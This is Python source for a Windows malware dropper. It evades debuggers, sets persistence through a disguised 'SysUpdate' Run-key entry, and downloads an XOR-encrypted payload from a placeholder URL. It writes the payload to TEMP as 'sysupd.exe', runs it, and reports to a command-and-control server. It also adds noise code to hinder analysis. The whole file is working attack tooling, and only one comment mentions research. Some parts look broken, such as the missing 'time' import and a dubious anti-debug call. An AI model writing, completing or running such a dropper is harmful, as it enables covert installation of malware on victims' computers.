import sys
import os
import requests
import winreg
import ctypes
import logging
import random
import string
import base64
import psutil
import threading
from ctypes import windll, c_buffer, c_int
from urllib.parse import urljoin

# Setup logging for error handling
logging.basicConfig(filename='dropper_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (to be set in secure config file for research)
CONFIG = {
    'payload_url': 'http://example.com/payload.exe',  # Attacker-controlled payload URL
    'drop_path': os.path.join(os.getenv('TEMP'), 'sysupd.exe'),
    'c2_url': 'http://example.com/c2',  # Command-and-control server
    'xor_key': b'r4nd0m_k3y_2025',
    'retry_interval': 5,  # Seconds between retries
    'max_retries': 3
}

# Obfuscation: Dead code to confuse decompilers
def _obfuscated_noise(): return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))

# XOR encryption for payloads and comms
def xor_crypt(data, key=CONFIG['xor_key']):
    try:
        return bytes(a ^ b for a, b in zip(data if isinstance(data, bytes) else data.encode(), key * (len(data) // len(key) + 1)))
    except Exception as e:
        logging.error(f"XOR encryption failed: {e}")
        return b''

# Anti-debugging: Check for debugger via NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Stealth: Registry persistence
def set_persistence():
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'SysUpdate', 0, winreg.REG_SZ, os.path.abspath(__file__))
    except Exception as e:
        logging.error(f"Persistence setup failed: {e}")

# Stealth: Simulate process hollowing by running in legitimate process context
def hollow_process():
    try:
        for proc in psutil.process_iter():
            if proc.name().lower() in ['explorer.exe', 'svchost.exe']:
                return proc.pid
        return os.getpid()
    except Exception as e:
        logging.error(f"Process hollowing simulation failed: {e}")
        return os.getpid()

# Download and decrypt payload
def download_payload():
    try:
        for _ in range(CONFIG['max_retries']):
            try:
                response = requests.get(CONFIG['payload_url'], timeout=10)
                if response.status_code == 200:
                    encrypted_payload = response.content
                    decrypted_payload = xor_crypt(encrypted_payload)
                    with open(CONFIG['drop_path'], 'wb') as f:
                        f.write(decrypted_payload)
                    return True
                else:
                    logging.warning(f"Download failed with status {response.status_code}")
            except requests.RequestException as e:
                logging.error(f"Download attempt failed: {e}")
            time.sleep(CONFIG['retry_interval'])
        return False
    except Exception as e:
        logging.error(f"Payload download failed: {e}")
        return False

# Execute payload
def execute_payload():
    try:
        os.startfile(CONFIG['drop_path'])
        _obfuscated_noise()  # Obfuscation: Call dead code
    except Exception as e:
        logging.error(f"Payload execution failed: {e}")

# C2 communication for status reporting
def report_to_c2(status):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        data = xor_crypt(status).hex()  # Encode status for stealth
        requests.post(CONFIG['c2_url'], data={'status': data}, headers=headers, timeout=10)
    except Exception as e:
        logging.error(f"C2 communication failed: {e}")

# Main dropper logic
def main():
    if is_debugged():
        sys.exit(1)  # Exit if debugged
    set_persistence()
    hollow_process()  # Simulate running in legit process
    
    # Download and execute payload in a separate thread
    def dropper_task():
        if download_payload():
            execute_payload()
            report_to_c2('Payload deployed successfully')
        else:
            report_to_c2('Payload download failed')
    
    threading.Thread(target=dropper_task, daemon=True).start()
    
    # Keep process alive to maintain persistence
    while True:
        time.sleep(60)
        _obfuscated_noise()  # Obfuscation: Periodic noise

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main loop failed: {e}")
        sys.exit(1)
